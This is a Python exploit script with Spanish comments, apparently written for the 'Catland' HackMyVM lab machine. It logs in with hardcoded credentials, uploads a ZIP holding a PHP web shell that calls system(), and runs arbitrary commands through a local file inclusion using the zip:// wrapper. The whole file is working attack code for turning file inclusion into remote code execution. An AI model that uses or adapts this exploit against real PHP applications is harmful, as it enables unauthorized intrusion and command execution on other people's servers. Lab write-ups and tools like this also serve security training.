#!/usr/bin/python3

import requests
import zipfile
import base64
import sys
import re

# :--------------------------------------------
# : Variables globales
# :--------------------------------------------
url_site = "http://admin.catland.hmv"
session = requests.Session()

# :--------------------------------------------
# : Funciones
# :--------------------------------------------
# : - Creamos archivo PHP y archivo ZIP
def create_zip_file(arg_command):
    file_name_php = 'payload.php'
    file_name_zip = 'bien_guardado_mi_zip.zip'

    file_content_to_write_php = "<?php echo 'HOLA'; system('{0}'); echo 'CHAO'; ?>".format(arg_command)

    # Archivo PHP
    with open(file_name_php, 'w') as file_content_php:
        file_content_php.write(file_content_to_write_php)

    # Archivo ZIP
    with zipfile.ZipFile(file_name_zip, mode='w') as file_content_zip:
        file_content_zip.write(file_name_php)

    return file_name_php, file_name_zip

# : - Subimos el ZIP al sitio web y ejecutamos RCE.
def uploadzip_to_rce(file_name_php, file_name_zip):
    # Generamos sesión para interactuar con los recursos del sistio web.
    data_post = {"username": "laura", "password": "laura_2008"}
    r = session.post(url_site + '/index.php', data=data_post)

    # Subimos ZIP
    data_file = {"the_file": (file_name_zip, open(file_name_zip, 'rb'), "application/zip")}
    r = session.post(url_site + '/upload.php', data={"submit":"Start Upload"}, files=data_file)#, proxies={"http":"http://127.0.0.1:8080"})

    # Extraemos resultados
    try:
        r = session.get(url_site + f'/user.php?page=zip://uploads/{file_name_zip}%23{file_name_php}', timeout=5)
        result_rce = re.findall(r'HOLA(.*?)CHAO', str(r.content))[0]

        print(result_rce.replace('\\n', '\n'))
    except requests.exceptions.Timeout:
        print("Este comando generó un delay probablemente por una REVERSE SHELL, si no, revisa.")
        exit(0)

# : - Hacemos una validación de campos usados en el programa:
# :    Miramos si hay conexión contra el servidor web.
# :    Y probamos que los argumentos del programa sean agregados.
def checks():
    try:
        # Para validar conexión
        r = requests.get(url_site, timeout=5)

        # Validamos argumento
        arg_command = sys.argv[1]
        return arg_command
    except requests.exceptions.RequestException as e:
        print("Añade el dominio 'admin.catland.hmv' al archivo /etc/hosts")
        exit(1)
    except IndexError:
        print(f"uso: {sys.argv[0]} COMANDO_A_EJECUTAR")
        exit(1)

# : - Controlamos el flujo del programa
def main():
    banner = base64.b64decode("CuKVk+KUgOKUgCDilZPilIDilIDilZbilZPilIDilIDilZbilZMgICDilZPilIDilIDilZbilZPilZYg4pWl4pWl4pSA4pSA4pWWCuKVkSAgIOKVkSAg4pWr4pWZIOKVkeKVnOKVkSAgIOKVkSAg4pWr4pWR4pWRIOKVkeKVkSAg4pWRCuKVqyAgIOKVkeKUgOKUgOKVoiAg4pWRIOKVqyAgIOKVkeKUgOKUgOKVouKVkeKVqyDilZEgICDilasK4pWZ4pSA4pSA4pSA4pWoICDilagg4pSA4pWoIOKVmeKUgOKUgOKUgOKVqCAg4pWo4pWo4pWZ4pSA4pWc4pSA4pSA4pSA4pWc4oCiIGJ5IGxhbnoKCkhhY2tNeVZNIDo6IENhdGxhbmQgOjogTEZJdG9SQ0UgbWVkaWFudGUgY29tcHJpbWlkb3MgKFpJUC9SQVIpCg==").decode()
    print(banner)

    # Validamos antes de empezar la matralla
    arg_command = checks()
    # Creamos archivos malignos
    file_name_php, file_name_zip = create_zip_file(arg_command)
    # Subimos ZIP y ejecutamos RCE
    uploadzip_to_rce(file_name_php, file_name_zip)

main()
